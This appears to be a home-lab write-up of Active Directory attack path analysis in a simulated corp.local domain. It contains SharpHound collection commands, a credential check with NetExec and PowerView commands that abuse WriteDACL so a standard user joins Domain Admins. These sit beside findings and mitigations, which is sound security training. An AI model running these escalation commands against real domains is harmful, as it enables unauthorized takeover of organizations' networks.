# 🩸 Phase 8 - BloodHound & Attack Path Analysis

## 🎯 Objective

Perform full Active Directory attack path analysis using BloodHound CE - ingesting
domain data via SharpHound, mapping privilege relationships, and identifying realistic
escalation paths from a standard domain user to Domain Admin.

---

## 🧱 Environment

| Role | Host | IP |
|------|------|----|
| Domain Controller | DC01.corp.local | 192.168.10.10 |
| Workstation | WS01.corp.local | 192.168.10.20 |
| Attacker | Kali Linux | 192.168.10.30 |
| Compromised Account | jsmith | Departments/HR |

---

## 🛠️ Tools

| Tool | Purpose |
|------|---------|
| Nmap | Port scanning and service fingerprinting |
| smbclient | SMB share access and file enumeration |
| rpcclient | RPC-based user and group enumeration |
| NetExec | SMB/LDAP authentication and domain enumeration |
| SharpHound | AD data collection for BloodHound ingestion |
| BloodHound CE | Attack path visualization and privilege analysis |

---

## 🧭 Attack Flow

```text
Reconnaisance & Service Enumeration
            ↓
Credential Validation (jsmith)
            ↓
SharpHound Data Collection (from WS01)
            ↓
BloodHound Ingestion & Graph Analysis
            ↓
Attack Path Identification
            ↓
Privilege Escalation Path Mapped
```

---

## 🔍 Phase 1 - Reconnaissance & Enumeration

Services enumerated on DC01 to map the attack surface:

| Service | Port | Finding |
|---------|------|---------|
| DNS | 53 | corp.local zone, SRV records exposed |
| SMB | 445 | Signing required, shares visible authenticated |
| LDAP | 389 | Base DN: `DC=corp,DC=local` |
| RPC | 135 | Endpoint mapper responding |
| Kerberos | 88 | Active - confirms DC role |

Anonymous enumeration was blocked (confirmed in Phase 7). All further
enumeration required valid credentials.

---

## 🔐 Phase 2 - Credential Validation

Valid domain credentials were confirmed via SMB authentication:

```bash
netexec smb 192.168.10.10 -u jsmith -p 'P@ssw0rd!' --shares
```

| Account | Privilege Level | Auth Result |
|---------|----------------|-------------|
| jsmith | Standard domain user | ✅ Authenticated |

> **Simulated scenario:** `jsmith` represents a credential obtained through
> phishing or password spraying - a standard domain user with no apparent
> elevated privileges at first glance.

![Authenticated Access](Screenshots/01-authenticated-smb-access.png)

---

## 📡 Phase 3 - SharpHound Data Collection

SharpHound was executed on WS01 (as `jsmith`) to collect AD relationship
data for BloodHound ingestion.

```powershell
.\SharpHound.exe -c All --outputdirectory C:\Temp\
```

| Collection Method | Data Gathered |
|-------------------|---------------|
| ACL | Object permissions and control relationships |
| Group | Group memberships across the domain |
| LocalAdmin | Local administrator relationships on machines |
| Session | Active user sessions on hosts |
| Trusts | Domain trust relationships |

![SharpHound Collection](Screenshots/02-sharphound-collection.png)

---

## 🩸 Phase 4 - BloodHound Analysis

SharpHound output was ingested into BloodHound CE and the domain graph
was analyzed for privilege escalation paths.

### Domain Overview

![BloodHound Domain Graph](Screenshots/03-bloodhound-domain-graph.png)

---

### 🚨 Key Finding - jsmith Object Control

BloodHound revealed that `jsmith` holds **inbound object control** over
highly privileged groups:

| Relationship | Source | Target | Risk |
|-------------|--------|--------|------|
| WriteDACL / GenericWrite | jsmith | Domain Admins | 🔴 Critical |
| WriteDACL / GenericWrite | jsmith | Enterprise Admins | 🔴 Critical |
| WriteDACL / GenericWrite | jsmith | Administrators | 🔴 Critical |

> A standard HR user with object control over Domain Admins represents a
> **critical misconfiguration** - this is the exact type of finding a real
> AD security assessment would flag as Priority 1.

![BloodHound jsmith Privileges](Screenshots/04-bloodhound-jsmith-object-control.png)

---

## 💣 Phase 5 - Attack Path

BloodHound mapped a direct privilege escalation path from `jsmith` to
Domain Admin:

```text
jsmith (Standard User)
      ↓  [WriteDACL on Domain Admins]
Modify group ACL → Add self to Domain Admins
      ↓
CORP\Domain Admins
      ↓
Full domain compromise
```

**Exploitation steps (simulated):**

```powershell
# Step 1 - Add jsmith to Domain Admins via WriteDACL abuse
Add-DomainObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity jsmith -Rights All

# Step 2 - Add self to group
Add-DomainGroupMember -Identity "Domain Admins" -Members jsmith

# Step 3 - Verify
Get-DomainGroupMember -Identity "Domain Admins"
```

![Attack Path Graph](Screenshots/05-bloodhound-attack-path.png)

---

## 🧠 Key Findings

| Finding | Severity | Description |
|---------|----------|-------------|
| jsmith WriteDACL on Domain Admins | 🔴 Critical | Standard user can escalate to DA |
| jsmith WriteDACL on Enterprise Admins | 🔴 Critical | Full forest compromise possible |
| Anonymous enumeration blocked | 🟢 Secure | Phase 6 hardening effective |
| SMB signing enforced | 🟢 Secure | Relay attacks mitigated |
| Excessive object control permissions | 🔴 Critical | ACL misconfiguration in AD |

---

## 🛡️ Recommended Mitigations

| Finding | Mitigation |
|---------|------------|
| WriteDACL on privileged groups | Audit and remove non-admin ACL entries on tier-0 groups |
| Excessive user privileges | Implement AD tiering model (Tier 0 / 1 / 2) |
| Object control misconfigurations | Run BloodHound regularly as part of AD hygiene |
| Credential exposure risk | Enforce MFA, monitor for spray patterns (Event ID 4625) |

---

## 🧠 Key Learnings

- BloodHound reveals privilege relationships that are invisible through
  standard AD tools - ACL misconfigurations are notoriously hard to
  spot manually across thousands of objects
- A standard domain user with `WriteDACL` on `Domain Admins` represents
  full domain compromise - privilege doesn't require a high-level account
  if ACLs are misconfigured
- SharpHound's ACL collection is the most impactful data source for
  finding escalation paths - always run with `-c All`
- The most dangerous AD misconfigurations are rarely obvious;
  BloodHound's `Shortest Path to Domain Admin` query is the fastest
  way to surface them
- Effective AD security requires both technical controls (SMB signing,
  lockout policies) and structural hygiene (ACL audits, tiering model)

---

## ✅ Outcome

| Phase | Result |
|-------|--------|
| Reconnaissance & enumeration | ✅ Full service map obtained |
| Credential validation | ✅ jsmith authenticated successfully |
| SharpHound collection | ✅ Full domain data ingested |
| BloodHound analysis | ✅ Attack paths identified |
| Privilege escalation path | 🔴 Critical path found - jsmith → Domain Admin |

BloodHound confirmed that `jsmith`, a standard HR user, holds a direct
privilege escalation path to Domain Admin through ACL misconfigurations -
a realistic and critical finding that would be Priority 1 in a real
AD security assessment.

👉 **Next:** [Phase 9 - Detection Engineering](../09-Detection-Engineering/)